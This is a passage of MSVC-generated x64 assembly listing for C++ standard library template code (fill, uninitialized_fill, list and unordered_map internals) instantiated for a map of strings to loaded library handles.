	cmp	rcx, rdx

; 1965 :     // copy _Val throughout raw [_First, _Last)
; 1966 :     _STD _Adl_verify_range(_First, _Last);
; 1967 :     auto _UFirst      = _STD _Get_unwrapped(_First);
; 1968 :     const auto _ULast = _STD _Get_unwrapped(_Last);
; 1969 :     if constexpr (_Fill_memset_is_safe<_Unwrapped_t<const _NoThrowFwdIt&>, _Tval>) {
; 1970 :         _STD _Fill_memset(_UFirst, _Val, static_cast<size_t>(_ULast - _UFirst));
; 1971 :     } else {
; 1972 :         if constexpr (_Fill_zero_memset_is_safe<_Unwrapped_t<const _NoThrowFwdIt&>, _Tval>) {
; 1973 :             if (_STD _Is_all_bits_zero(_Val)) {
; 1974 :                 _STD _Fill_zero_memset(_UFirst, static_cast<size_t>(_ULast - _UFirst));
; 1975 :                 return;
; 1976 :             }
; 1977 :         }
; 1978 : 
; 1979 :         _Uninitialized_backout<_Unwrapped_t<const _NoThrowFwdIt&>> _Backout{_UFirst};
; 1980 :         while (_Backout._Last != _ULast) {

	je	SHORT $LN3@uninitiali
	npad	11
$LL2@uninitiali:

; 1597 :         _STD _Construct_in_place(*_Last, _STD forward<_Types>(_Vals)...);

	mov	rax, QWORD PTR [r8]
	mov	QWORD PTR [rcx], rax

; 1598 :         ++_Last;

	add	rcx, 8

; 1965 :     // copy _Val throughout raw [_First, _Last)
; 1966 :     _STD _Adl_verify_range(_First, _Last);
; 1967 :     auto _UFirst      = _STD _Get_unwrapped(_First);
; 1968 :     const auto _ULast = _STD _Get_unwrapped(_Last);
; 1969 :     if constexpr (_Fill_memset_is_safe<_Unwrapped_t<const _NoThrowFwdIt&>, _Tval>) {
; 1970 :         _STD _Fill_memset(_UFirst, _Val, static_cast<size_t>(_ULast - _UFirst));
; 1971 :     } else {
; 1972 :         if constexpr (_Fill_zero_memset_is_safe<_Unwrapped_t<const _NoThrowFwdIt&>, _Tval>) {
; 1973 :             if (_STD _Is_all_bits_zero(_Val)) {
; 1974 :                 _STD _Fill_zero_memset(_UFirst, static_cast<size_t>(_ULast - _UFirst));
; 1975 :                 return;
; 1976 :             }
; 1977 :         }
; 1978 : 
; 1979 :         _Uninitialized_backout<_Unwrapped_t<const _NoThrowFwdIt&>> _Backout{_UFirst};
; 1980 :         while (_Backout._Last != _ULast) {

	cmp	rcx, rdx
	jne	SHORT $LL2@uninitiali
$LN3@uninitiali:

; 1981 :             _Backout._Emplace_back(_Val);
; 1982 :         }
; 1983 : 
; 1984 :         _Backout._Release();
; 1985 :     }
; 1986 : }

	ret	0
??$uninitialized_fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z ENDP ; std::uninitialized_fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z
_TEXT	SEGMENT
_First$ = 16
_Last$ = 24
_Val$ = 32
??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z PROC ; std::fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >, COMDAT

; 5140 : _CONSTEXPR20 void fill(const _FwdIt _First, const _FwdIt _Last, const _Ty& _Val) {

$LN21:
	sub	rsp, 8
	mov	r10, rdx

; 5141 :     // copy _Val through [_First, _Last)
; 5142 :     _STD _Adl_verify_range(_First, _Last);
; 5143 :     if constexpr (_Is_vb_iterator<_FwdIt, true>) {
; 5144 :         _STD _Fill_vbool(_First, _Last, _Val);
; 5145 :     } else {
; 5146 :         auto _UFirst      = _STD _Get_unwrapped(_First);

	xor	eax, eax
	sub	rdx, rcx
	mov	r9, rcx
	add	rdx, 7
	shr	rdx, 3
	cmp	rcx, r10
	cmova	rdx, rax

; 5147 :         const auto _ULast = _STD _Get_unwrapped(_Last);
; 5148 : #if _HAS_CXX20
; 5149 :         if (!_STD is_constant_evaluated())
; 5150 : #endif // _HAS_CXX20
; 5151 :         {
; 5152 :             if constexpr (_Fill_memset_is_safe<decltype(_UFirst), _Ty>) {
; 5153 :                 _STD _Fill_memset(_UFirst, _Val, static_cast<size_t>(_ULast - _UFirst));
; 5154 :                 return;
; 5155 :             } else if constexpr (_Fill_zero_memset_is_safe<decltype(_UFirst), _Ty>) {
; 5156 :                 if (_STD _Is_all_bits_zero(_Val)) {
; 5157 :                     _STD _Fill_zero_memset(_UFirst, static_cast<size_t>(_ULast - _UFirst));
; 5158 :                     return;
; 5159 :                 }
; 5160 :             }
; 5161 :         }
; 5162 : 
; 5163 :         for (; _UFirst != _ULast; ++_UFirst) {

	test	rdx, rdx
	je	SHORT $LN10@fill
	cmp	rdx, 2
	jb	SHORT $LN10@fill

; 5164 :             *_UFirst = _Val;

	mov	rax, QWORD PTR [r8]
	add	rcx, -8
	lea	rcx, QWORD PTR [rcx+rdx*8]
	cmp	r9, r8
	ja	SHORT $LN11@fill

; 5141 :     // copy _Val through [_First, _Last)
; 5142 :     _STD _Adl_verify_range(_First, _Last);
; 5143 :     if constexpr (_Is_vb_iterator<_FwdIt, true>) {
; 5144 :         _STD _Fill_vbool(_First, _Last, _Val);
; 5145 :     } else {
; 5146 :         auto _UFirst      = _STD _Get_unwrapped(_First);

	cmp	rcx, r8
	jae	SHORT $LN10@fill
$LN11@fill:
	mov	QWORD PTR [rsp], rdi
	and	rdx, -2
	mov	rdi, r9
	lea	rdx, QWORD PTR [rdx*8]
	mov	rcx, rdx
	shr	rcx, 3
	rep stosq
	add	r9, rdx
	mov	rdi, QWORD PTR [rsp]
$LN10@fill:

; 5147 :         const auto _ULast = _STD _Get_unwrapped(_Last);
; 5148 : #if _HAS_CXX20
; 5149 :         if (!_STD is_constant_evaluated())
; 5150 : #endif // _HAS_CXX20
; 5151 :         {
; 5152 :             if constexpr (_Fill_memset_is_safe<decltype(_UFirst), _Ty>) {
; 5153 :                 _STD _Fill_memset(_UFirst, _Val, static_cast<size_t>(_ULast - _UFirst));
; 5154 :                 return;
; 5155 :             } else if constexpr (_Fill_zero_memset_is_safe<decltype(_UFirst), _Ty>) {
; 5156 :                 if (_STD _Is_all_bits_zero(_Val)) {
; 5157 :                     _STD _Fill_zero_memset(_UFirst, static_cast<size_t>(_ULast - _UFirst));
; 5158 :                     return;
; 5159 :                 }
; 5160 :             }
; 5161 :         }
; 5162 : 
; 5163 :         for (; _UFirst != _ULast; ++_UFirst) {

	cmp	r9, r10
	je	SHORT $LN3@fill
	npad	9
$LL9@fill:

; 5164 :             *_UFirst = _Val;

	mov	rax, QWORD PTR [r8]
	mov	QWORD PTR [r9], rax
	add	r9, 8
	cmp	r9, r10
	jne	SHORT $LL9@fill
$LN3@fill:

; 5165 :         }
; 5166 :     }
; 5167 : }

	add	rsp, 8
	ret	0
??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z ENDP ; std::fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
_Val1$dead$ = 24
??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 353  :     _List_val() noexcept : _Myhead(), _Mysize(0) {} // initialize data

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1501 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	rax, rcx
	ret	0
??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@0@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@0@Z PROC ; std::_Construct_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &>, COMDAT

; 382  : #if _HAS_CXX20
; 383  :     if (_STD is_constant_evaluated()) {
; 384  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 385  :     } else
; 386  : #endif // _HAS_CXX20
; 387  :     {
; 388  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);
; 389  :     }
; 390  : }

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	ret	0
??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@0@Z ENDP ; std::_Construct_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Get_size_of_n@$0DI@@std@@YA_K_K@Z
_TEXT	SEGMENT
_Count$dead$ = 8
??$_Get_size_of_n@$0DI@@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<56>, COMDAT

; 80   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;
; 81   : 
; 82   :     if constexpr (_Overflow_is_possible) {
; 83   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 84   :         if (_Count > _Max_possible) {
; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	mov	eax, 56					; 00000038H

; 90   : }

	ret	0
??$_Get_size_of_n@$0DI@@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<56>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Release@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Release, COMDAT

; 1602 :         _First = _Last;

	mov	rax, QWORD PTR [rcx+8]
	mov	QWORD PTR [rcx], rax

; 1603 :         return _Last;
; 1604 :     }

	ret	0
?_Release@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Release
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ PROC ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::~_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>, COMDAT

; 1591 :         _STD _Destroy_range(_First, _Last);
; 1592 :     }

	ret	0
??1?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ENDP ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::~_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
_Dest$ = 16
??0?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z PROC ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>, COMDAT

; 1583 :     constexpr explicit _Uninitialized_backout(_NoThrowFwdIt _Dest) : _First(_Dest), _Last(_Dest) {}

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	mov	QWORD PTR [rcx+8], rdx
	ret	0
??0?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z ENDP ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Erase_bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z
_TEXT	SEGMENT
this$dead$ = 8
_Plist$ = 16
_Bucket$ = 24
?_Erase_bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Erase_bucket, COMDAT

; 1662 :         // remove the node _Plist from its bucket
; 1663 :         _Nodeptr& _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	shl	r8, 4
	add	rcx, r8

; 1664 :         _Nodeptr& _Bucket_hi = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;
; 1665 :         if (_Bucket_hi == _Plist) {

	mov	rax, QWORD PTR [rcx]
	cmp	QWORD PTR [rcx+8], rdx
	jne	SHORT $LN2@Erase_buck

; 1666 :             if (_Bucket_lo == _Plist) { // make bucket empty

	cmp	rax, rdx
	jne	SHORT $LN4@Erase_buck

; 1667 :                 const auto _End = _List._Mypair._Myval2._Myhead;

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8

; 1668 : 
; 1669 :                 _Bucket_lo = _End;

	mov	QWORD PTR [rcx], rax

; 1673 :             }

	mov	QWORD PTR [rcx+8], rax

; 1676 :         }
; 1677 :     }

	ret	0
$LN4@Erase_buck:

; 1670 :                 _Bucket_hi = _End;
; 1671 :             } else {
; 1672 :                 _Bucket_hi = _Plist->_Prev; // move end back one element

	mov	rax, QWORD PTR [rdx+8]

; 1673 :             }

	mov	QWORD PTR [rcx+8], rax

; 1676 :         }
; 1677 :     }

	ret	0
$LN2@Erase_buck:

; 1674 :         } else if (_Bucket_lo == _Plist) {

	cmp	rax, rdx
	jne	SHORT $LN6@Erase_buck

; 1675 :             _Bucket_lo = _Plist->_Next; // move beginning up one element

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
$LN6@Erase_buck:

; 1676 :         }
; 1677 :     }

	ret	0
